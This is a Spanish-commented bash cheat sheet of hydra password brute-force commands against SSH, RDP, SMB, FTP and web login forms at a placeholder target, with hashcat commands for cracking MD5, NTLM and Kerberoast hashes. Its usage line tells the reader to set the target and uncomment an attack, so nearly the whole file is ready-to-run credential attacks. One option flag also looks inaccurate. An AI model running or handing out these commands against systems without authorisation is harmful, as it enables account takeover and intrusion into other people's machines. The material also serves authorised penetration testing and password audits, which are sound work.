#!/usr/bin/env bash
# Nombre: hydra-cheatsheet
# Descripción: Lista de ataques de fuerza bruta con hydra sobre SSH, RDP, SMB, FTP y HTTP, más notas de hashcat para modo offline.
# Tags: hydra, brute-force, password, ftp, ssh, rdp, smb, hashcat
# Uso: editar TARGET/USER/WORDLIST y descomentar el ataque deseado

TARGET="192.168.1.100"
USER="admin"
WORDLIST="/usr/share/wordlists/rockyou.txt"

echo "=== SSH ==="
# hydra -l $USER -P $WORDLIST ssh://$TARGET
# hydra -L users.txt -P $WORDLIST ssh://$TARGET -t 4        # listas en ambos lados, 4 hilos

echo -e "\n=== RDP ==="
# hydra -L users.txt -P $WORDLIST rdp://$TARGET

echo -e "\n=== SMB ==="
# hydra -L users.txt -P $WORDLIST smb://$TARGET

echo -e "\n=== FTP ==="
# hydra -l $USER -P $WORDLIST ftp://$TARGET

echo -e "\n=== HTTP basic / POST (login web) ==="
# hydra -l $USER -P $WORDLIST http-get://$TARGET/ -f
# hydra -l $USER -P $WORDLIST http-post-form://$TARGET/login:user=^USER^&pass=^PASS^:INCORRECT -f
#   ^USER^ y ^PASS^ son los marcadores; el texto final es el mensaje de error del formulario

echo -e "\n=== Modos comunes ==="
# hydra -C combo_user_pass.txt ssh://$TARGET   # login:password en una sola linea
# -t 16    # hilos    -max 3 (pocas)  -o /tmp/hydra.out   # menor impacto

echo -e "\n=== HASHCAT (offline, no toca el objetivo) ==="
# hashcat -m 0      hash.txt $WORDLIST          # MD5
# hashcat -m 1000   hash.txt $WORDLIST          # NTLM (Windows/LDAP)
# hashcat -m 13100  hash.txt $WORDLIST          # Kerberoast
# hashcat --show hash.txt                       # ver hashes ya rotos